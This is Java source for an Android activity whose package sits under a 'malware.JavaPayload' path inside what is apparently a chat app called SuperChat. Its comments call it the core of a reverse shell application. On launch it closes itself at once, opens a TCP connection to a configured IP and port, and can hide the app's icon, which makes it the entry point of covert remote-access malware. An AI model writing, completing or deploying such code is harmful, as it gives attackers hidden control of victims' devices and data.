package com.teamxdevelopers.SuperChat.malware.JavaPayload;

// Import statements for necessary Android and support classes.
import androidx.appcompat.app.AppCompatActivity;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.config;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.functions;

/*
This code defines MainActivity, an Android activity that plays a central role in a reverse shell application.
The purpose of this activity is to start a TCP connection to a specified IP address and port when the activity is created.
It also has an option to hide the app icon based on a configuration setting. Here's a breakdown of the code with comments for better understanding:
 */
// MainActivity extends AppCompatActivity, providing compatibility support for various Android versions and features.
public class MainActivity extends AppCompatActivity {

    // Activity and Context references for later use in the application.
    Activity activity = this;
    Context context;
    // TAG used for logging.
    static String TAG = "MainActivityClass";
    // Reference for WakeLock, but it's initialized and not used within this code snippet.
    private PowerManager.WakeLock mWakeLock = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Overrides pending transitions to make activity transition instant.
        overridePendingTransition(0, 0);
        // Gets the application context.
        context = getApplicationContext();
        // Logs the IP and port being used for the TCP connection.
        Log.d(TAG, config.IP+"\t"+config.port);
        // Finishes the activity right after starting it.
        finish();
        // Starts a new tcpConnection AsyncTask to handle network operations in the background.
        new tcpConnection(activity,context).execute(config.IP,config.port);
        // Overrides pending transitions again to ensure the activity finishes instantly.
        overridePendingTransition(0, 0);
        // If the configuration specifies, hides the app icon.
        if(config.icon){
            new functions(activity).hideAppIcon(context);
        }
    }
}
